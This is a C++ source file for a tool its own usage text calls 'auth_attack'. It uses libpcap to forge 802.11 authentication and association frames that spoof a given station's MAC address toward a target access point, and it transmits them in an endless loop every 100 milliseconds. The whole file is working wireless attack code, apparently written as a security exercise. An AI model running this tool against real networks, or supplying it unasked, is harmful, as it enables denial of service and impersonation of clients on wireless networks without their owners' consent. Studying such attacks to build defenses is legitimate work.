#include <iostream>
#include <pcap.h>
#include <string.h>  // for memcpy
#include <unistd.h>  // for sleep
#include <mac.h>
#include <association.h>
#include <authentication.h>

using namespace std;

void usage() {
    cout << "syntax : auth_attack <interface> <ap mac> <station mac>\n";
    cout << "sample : auth_attack wlan0 00:11:22:33:44:55 66:77:88:99:AA:BB\n";
}

int main(int argc , char * argv[]) {

    if (argc != 4) {
        usage();
        return -1;
    }

    cout << "** Auth_attack Start **\n";

    char * Interface = argv[1];
    char * AP_MAC = argv[2];
    char * ST_MAC = argv[3];

    int i=0;
    uint8_t s[2]={0x00,0x00};
    uint8_t ven[6] = {0x02,0x00,0x00,0x10,0x00,0x00};

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(Interface, BUFSIZ, 1, 1000, errbuf);
    if (handle == nullptr) {
        cout << "pcap handle error! \n";
        return -1;
    }

    struct Authentication_Packet packet;

    packet.auth_radiotab.len = 0x000b;
    packet.auth_frame.type = 0x00b0;
    packet.auth_frame.dur = 0x013a;
    packet.auth_frame.dst_mac = Mac(AP_MAC);
    packet.auth_frame.src_mac = Mac(ST_MAC);
    packet.auth_frame.bssid = Mac(AP_MAC);
    packet.auth_wmanage.fixed_pa.auth_SEQ = 0x0001;
    packet.auth_wmanage.tag_pa.tag_num = 0xdd;
    packet.auth_wmanage.tag_pa.tag_len = 0x09;
    packet.auth_wmanage.tag_pa.OUI[1] = 0x10;
    packet.auth_wmanage.tag_pa.OUI[2] = 0x18;
    memcpy(packet.auth_wmanage.tag_pa.ven_Data,ven,6);

    struct Association_Packet packet2;

    packet2.asso_radiotab.len = 0x000b;
    packet2.asso_frame.type = 0x0000;
    packet2.asso_frame.dur = 0x013a;
    packet2.asso_frame.dst_mac = Mac(AP_MAC);
    packet2.asso_frame.src_mac = Mac(ST_MAC);
    packet2.asso_frame.bssid = Mac(AP_MAC);
    packet2.asso_wmanage.fixed_pa.cap_info = 0x1531;
    packet2.asso_wmanage.fixed_pa.lis_inter = 0x000a;
    memcpy(packet2.asso_wmanage.tag_ssid,s,2);

    while(1) {
        int res = pcap_sendpacket(handle,reinterpret_cast<const u_char*>(&packet),sizeof(Authentication_Packet));
        if (res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
            break;
        }

        int res2 = pcap_sendpacket(handle,reinterpret_cast<const u_char*>(&packet2),sizeof(Association_Packet));
        if (res2 != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
            break;
        }
        cout << "Packet  " << i << endl;
        i++;
        usleep(100000);
    }

    pcap_close(handle);
    cout << "Success!!\n";
}
